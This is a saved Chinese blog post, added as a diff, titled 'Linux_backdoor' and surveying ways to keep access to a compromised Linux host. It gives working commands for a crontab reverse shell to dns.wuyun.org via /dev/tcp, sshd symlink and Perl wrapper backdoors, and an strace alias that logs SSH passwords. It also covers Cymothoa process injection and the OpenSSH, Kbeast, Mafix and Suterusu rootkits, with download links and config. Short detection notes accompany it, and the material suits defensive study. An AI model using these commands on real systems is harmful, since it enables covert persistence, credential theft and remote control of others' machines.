@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Linux_backdoor - l3m0n - 博客园</title>
+<link href="./Linux_backdoor - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./Linux_backdoor - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./Linux_backdoor - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./Linux_backdoor - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./Linux_backdoor - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./Linux_backdoor - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./Linux_backdoor - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./Linux_backdoor - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./Linux_backdoor - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./Linux_backdoor - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./Linux_backdoor - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/linux_backdoor.html" id="cb_post_title_url">Linux_backdoor</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><h3 id="linux权限维持">Linux权限维持</h3>
+<h5 id="前言">前言</h5>
+<p>并未深入研究backdoor是怎么写的，只是研究一下网上存在的几种后门的用法。<br/>
+测试环境:centos 6.5</p>
+<h5 id="crontab">crontab</h5>
+<p>计划任务,永远的爱<br/>
+每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
+<pre><code>(crontab -l;printf "*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -</code></pre>
+<h5 id="硬链接sshd">硬链接sshd</h5>
+<pre><code>上了防火墙的坑...测试前关闭一下吧
+service iptables stop
+出现：ssh: connect to host 192.168.206.142 port 2333: No route to host</code></pre>
+<pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
+ssh root@192.168.206.142 -p 2333
+用root/bin/ftp/mail当用户名,密码任意</code></pre>
+<p>后门排查：</p>
+<pre><code>netstat -anopt
+查找有问题的进程
+ps -ef | grep pid
+ls -al /tmp/su
+kill -9 pid
+rm -rf /tmp/su</code></pre>
+<p><img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124649421-50790.jpg"/></p>
+<h5 id="ssh-server-wrapper">SSH Server wrapper</h5>
+<p>条件：开启ssh，如果不连接是没有端口进程的，而且last也看不到</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">cd</span> /usr/sbin
+<span class="kw">mv</span> sshd ../bin
+<span class="kw">echo</span> <span class="st">'#!/usr/bin/perl'</span> <span class="kw">&gt;</span>sshd
+
+<span class="kw">echo</span> <span class="st">'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);'</span> <span class="kw">&gt;&gt;</span>sshd
+
+<span class="kw">echo</span> <span class="st">'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,'</span> <span class="kw">&gt;&gt;</span>sshd
+<span class="kw">chmod</span> u+x sshd
+<span class="kw">/</span>/不用重启也行
+<span class="kw">/etc/init.d/sshd</span> restart</code></pre></div>
+<p>kali下的执行</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">socat</span> STDIO TCP4:192.168.206.142:22,sourceport=13377</code></pre></div>
+<p>对于源端口的修改：</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="op">&gt;&gt;&gt;</span> <span class="im">import</span> struct
+<span class="op">&gt;&gt;&gt;</span> <span class="bu">buffer</span> <span class="op">=</span> struct.pack(<span class="st">'&gt;I6'</span>,<span class="dv">19526</span>)
+<span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span> <span class="bu">repr</span>(<span class="bu">buffer</span>)
+<span class="co">'\x00\x00LF'</span>
+<span class="op">&gt;&gt;&gt;</span> <span class="bu">buffer</span> <span class="op">=</span> struct.pack(<span class="st">'&gt;I6'</span>,<span class="dv">13377</span>)
+<span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span> <span class="bu">buffer</span>
+4A</code></pre></div>
+<p>后门排查：</p>
+<pre><code>netstat -anopt
+//查看一下sshd进程情况,如果发现不是/usr/sbin/目录下面,就有问题
+ll /proc/1786
+cat /usr/sbin/sshd</code></pre>
+<p><img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124705155-1144488989.jpg"/></p>
+<p>还原：</p>
+<pre><code>rm -rf /usr/sbin/sshd; mv /usr/bin/sshd ../sbin;</code></pre>
+<h5 id="ssh-keylogger">SSH keylogger</h5>
+<p>vim当前用户下的.bashrc文件,末尾添加</p>
+<pre><code>alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'</code></pre>
+<p>然后使配置生效</p>
+<pre><code>source .bashrc</code></pre>
+<p>当本地su或者ssh的时候,就会在tmp下面记录(无论失败成功都有记录)<br/>
+<img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124713452-1885087691.jpg"/></p>
+<h5 id="cymothoa_进程注入backdoor">Cymothoa_进程注入backdoor</h5>
+<p>很赞的点是注入到的进程,只要有权限就行,然后反弹的也就是进程相应的权限(并不需要root那样),当然进程重启或者挂了也就没了.当然动作也是很明显的。<br/>
+线程注入：</p>
+<pre><code>./cymothoa -p 2270 -s 1 -y 7777</code></pre>
+<p><img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124724827-1569125790.jpg"/></p>
+<pre><code>nc -vv ip 7777</code></pre>
+<h5 id="openssh_rookit">openssh_rookit</h5>
+<p>下载地址：<a class="uri" href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</a></p>
+<p>先patch</p>
+<pre><code>wget http://mirror.corbina.net/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
+tar zxvf openssh-5.9p1.tar.gz
+cp sshbd5.5p1.diff openssh-5.9p1/
+cd openssh-5.9p1
+patch &lt; sshbd5.9p1.diff</code></pre>
+<p>安装依赖</p>
+<pre><code>yum install zlib-devel
+yum install openssl-devel
+yun install pam-devel
+yun install krb5-lib(没安装)</code></pre>
+<p>修改includes.h<br/>
+<img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124736859-1043139926.jpg"/></p>
+<p>编译安装再重启sshd服务</p>
+<pre><code>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+make &amp;&amp; make install &amp;&amp; service  sshd restart</code></pre>
+<p>利用：<br/>
+会记录登入登出的ssh账号密码(错误的也会记录),配置文件中设置的密码,也可以通过ssh然后root登陆。<br/>
+<img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124743984-1526622001.jpg"/></p>
+<p>发现：<br/>
+<img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124750671-952601939.jpg"/></p>
+<p>找到可疑sshd并且查看一下last的登陆ip，最后kill他们的进程,清除暂时不知</p>
+<h5 id="kbeast_rootkit">Kbeast_rootkit</h5>
+<p><a class="uri" href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz</a></p>
+<pre><code>tar -zxvf ipsecs-kbeast-v1.tar.gz
+cd kbeast-v1/
+vi config.h</code></pre>
+<p>重要配置：</p>
+<pre><code>//键盘记录
+#define _LOGFILE_ "acctlog"
+
+//rookit产生的日志配置文件所存储位置(此位置是被隐藏的)
+#define _H4X_PATH_ "/usr/_h4x_"
+
+//telnet端口(端口也是隐藏的,netstat是看不到的)
+#define _HIDE_PORT_ 23333
+
+//telnet的端口以及返回回来的用户名(必须能调用/sh/bash,否则安装会出现Network Daemon错误)
+#define _RPASSWORD_ "lolloltest"
+#define _MAGIC_NAME_ "root"</code></pre>
+<p>利用：<br/>
+1、 记录：<br/>
+<img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124800952-426504836.jpg"/></p>
+<p>2、 telnet连接<br/>
+<img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124807671-2004271740.jpg"/></p>
+<p>缺点：重启就会失效,需要放入启动项<br/>
+优点：相比上面都是需要ssh相关或者是有一个低权限维持才能发挥的一个后门,这个是直接开放一个独立的端口</p>
+<p>发现：其实感觉修改一下进程名,发现还是有点麻烦</p>
+<p><img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124814624-2004075871.jpg"/></p>
+<h5 id="mafix-suterusu-rookit">Mafix + Suterusu rookit</h5>
+<p>1、Mafix</p>
+<pre><code>./root lolloltest 23333</code></pre>
+<p>这样就会产生一个端口为23333,root密码也可以用lolloltest登陆的ssh,端口不隐藏</p>
+<p><img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124821718-1388315376.jpg"/></p>
+<p>这时候就可以用Suterusu配合使用</p>
+<p>2、Suterusu<br/>
+功能表：</p>
+<pre><code>Get root
+$ ./sock 0
+Hide PID
+$ ./sock 1 [pid]
+Unhide PID
+$ ./sock 2 [pid]
+Hide TCPv4 port
+$ ./sock 3 [port]
+Unhide TCPv4 port
+$ ./sock 4 [port]
+Hide TCPv6 port
+$ ./sock 5 [port]
+Unhide TCPv6 port
+$ ./sock 6 [port]
+Hide UDPv4 port
+$ ./sock 7 [port]
+Unhide UDPv4 port
+$ ./sock 8 [port]
+Hide UDPv6 port
+$ ./sock 9 [port]
+Unhide UDPv6 port
+$ ./sock 10 [port]
+Hide file/directory
+$ ./sock 11 [name]
+Unhide file/directory
+$ ./sock 12 [name]</code></pre>
+<p>编译：</p>
+<pre><code>make linux-x86 KDIR=/lib/modules/$(uname -r)/build
+gcc sock.c -o sock
+//加载模块
+insmod suterusu.ko</code></pre>
+<p>结合Mafix使用(隐藏端口):</p>
+<pre><code>./sock 3 [port]</code></pre>
+<p><img src="./Linux_backdoor - l3m0n - 博客园/804631-20160513124833109-1192260674.jpg"/></p>
+<h5 id="参考资料">参考资料</h5>
+<p><a class="uri" href="https://www.aldeid.com/wiki/Cymothoa">https://www.aldeid.com/wiki/Cymothoa</a><br/>
+<a class="uri" href="http://phrack.org/issues/68/9.html">http://phrack.org/issues/68/9.html</a><br/>
+<a class="uri" href="http://www.joychou.org/index.php/web/ssh-backdoor.html">http://www.joychou.org/index.php/web/ssh-backdoor.html</a></p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-05-13 12:49</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=5489005" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(5489005);return false;">收藏</a></div>
+</div>
+<script src="./Linux_backdoor - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=5489005,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/5/13 12:49:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./Linux_backdoor - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./Linux_backdoor - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./Linux_backdoor - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
